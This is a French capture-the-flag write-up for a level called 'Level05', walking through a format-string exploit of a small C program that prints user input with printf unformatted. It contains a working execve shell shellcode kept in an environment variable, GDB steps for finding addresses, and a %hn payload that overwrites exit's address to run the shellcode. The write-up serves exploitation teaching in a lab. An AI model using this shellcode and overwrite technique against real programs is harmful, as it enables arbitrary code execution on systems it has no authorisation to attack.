# Level05

Pour ce niveau, il s'agit d'exploiter une vulnérabilité de type "format string" dans un programme C.

## Étapes de résolution

1. **Analyse du programme**
   - Le programme lit un input utilisateur (max 100 caractères).
   - Il convertit les majuscules en minuscules.
   - Il affiche l'input avec `printf(input_buffer);` sans format, ce qui introduit une vulnérabilité de type format string.

2. **Trouver l'offset pour l'attaque format string**
   - On envoie :
     ```sh
     python -c 'print("AAAA" + "%x "*25)'
     ```
   - On observe que l'offset pour atteindre notre payload est 10.

3. **Préparer le shellcode**
   - On place un shellcode dans une variable d'environnement :
     ```sh
     export SHELLCODE=$(python -c 'print("\x90"*90 + "\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
     ```
   - On trouve son adresse dans GDB :
     ```gdb
     break main
     run
     x/20s *((char**)environ)
     ```
     Exemple d'adresse trouvée : `0xffffde05`

4. **Trouver une fonction à réécrire**
   - On choisit de réécrire l'adresse de `exit` (appelée après le printf).
   - Adresse à modifier trouver dans gdb avec disas main puis disas le call a la fonction exit: `0x80497e0`

5. **Construire le payload d'exploitation**
   - On split l'adresse du shellcode pour écrire en deux fois (2 bytes à la fois) :
     - `ffff` = 65535
     - `de05` = 56837 (on ajoute 0x10 pour tomber dans le NOP sled : 56853)
   - Payload :
     ```sh
     (python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56845x%10$hn%8682x%11$hn" )'; cat) | ./level05
     ```

## Explication du code vulnérable

```c
void main(void)
{
    char input_buffer[100];
    int index = 0;
    
    fgets(input_buffer, 100, stdin);
    

    int string_length = 0;
    char *ptr = input_buffer;
    while (*ptr != '\0') {
        string_length++;
        ptr++;
    }
    
    index = 0;
    while (true) {
        if (index >= string_length) {

            printf(input_buffer);  // Notre Vulnérabilité
            exit(0);
        }
        
        // Convertie maj en min
        if (('@' < input_buffer[index]) && (input_buffer[index] < '[')) {
            input_buffer[index] = input_buffer[index] ^ 0x20;
        }
        
        index++;
    }
}
```

## Notes
- Cette attaque exploite la vulnérabilité format string pour écraser l'adresse de sortie du programme et rediriger l'exécution vers notre shellcode placé dans l'environnement.
- L'utilisation de `env -i` permet de contrôler précisément l'environnement et d'alléger l'espace mémoire pour placer le shellcode à une adresse prévisible.\

Si vous avez des difficulté a tomber sur votre shellcode malgré le MOP sled alors **lancez le binaire dans un environnement minimal**
   ```sh
   env -i ./level05
   ```
   Cela permet d'avoir un environnement propre et de placer facilement un shellcode dans une variable d'environnement.
